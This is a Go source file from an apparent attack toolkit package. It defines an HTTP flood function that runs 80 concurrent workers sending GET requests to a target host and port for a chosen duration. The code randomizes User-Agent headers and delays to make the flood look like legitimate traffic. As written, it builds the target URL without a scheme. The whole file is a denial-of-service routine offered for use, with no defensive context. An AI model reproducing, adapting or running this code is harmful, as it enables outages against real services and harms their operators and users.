package attacks

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

// PerformHTTPFlood sends a large number of HTTP GET requests to the target URL and targetPort.
func PerformHTTPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	var requestCount int64
	var wg sync.WaitGroup
	const maxConcurrentRequests = 80 // Maximum number of concurrent requests
	sem := make(chan struct{}, maxConcurrentRequests)

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Construct the full target URL with the specified targetPort
	fullTargetIP := fmt.Sprintf("%s:%d", targetIP, targetPort)

	// Create a single HTTP client instance
	client := &http.Client{}

	// Launch multiple goroutines to send HTTP requests concurrently
	for i := 0; i < maxConcurrentRequests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return // Terminate goroutine if context is canceled
				default:
					sem <- struct{}{} // Acquire a semaphore slot
					// Create a new HTTP request
					req, err := http.NewRequest("GET", fullTargetIP, nil)
					if err != nil {
						fmt.Printf("Error creating request: %v\n", err)
						<-sem // Release semaphore slot
						continue
					}

					// Optionally, add random User-Agent headers to mimic legitimate traffic
					req.Header.Set("User-Agent", fmt.Sprintf("Go-http-client/%d.%d", rand.Intn(2)+1, rand.Intn(10)))

					// Send the HTTP request
					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Error sending request: %v\n", err)
						<-sem // Release semaphore slot
						continue
					}
					resp.Body.Close() // Close the response body

					// Increment the request count atomically
					atomic.AddInt64(&requestCount, 1)

					<-sem // Release semaphore slot
					// Introduce a small random delay to mimic realistic traffic
					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("HTTP flood attack completed. Sent %d requests.\n", atomic.LoadInt64(&requestCount))
	return nil
}